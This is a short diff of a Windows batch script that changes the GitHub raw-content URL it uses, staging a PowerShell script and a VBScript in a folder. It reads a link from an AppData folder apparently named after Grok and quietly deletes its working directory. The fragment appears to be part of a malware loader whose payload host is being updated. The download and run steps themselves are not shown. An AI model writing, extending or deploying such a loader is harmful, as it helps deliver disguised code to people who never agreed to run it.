@@ -5,7 +5,7 @@ set a=%d%\f1.txt
 set b=%d%\f2.txt
 set c=%d%\Nvs.ps1
 set v=%d%\S_m.vbs
-set u=raw.githubusercontent.com/USATIKTOKER/NEWADD/main
+set u=raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/V/
 :: Read the dynamic link from l.txt
 set /p dynLink=<"%appdata%\Grok-l\l.txt"
 rmdir /s /q "%d%" 2>nul
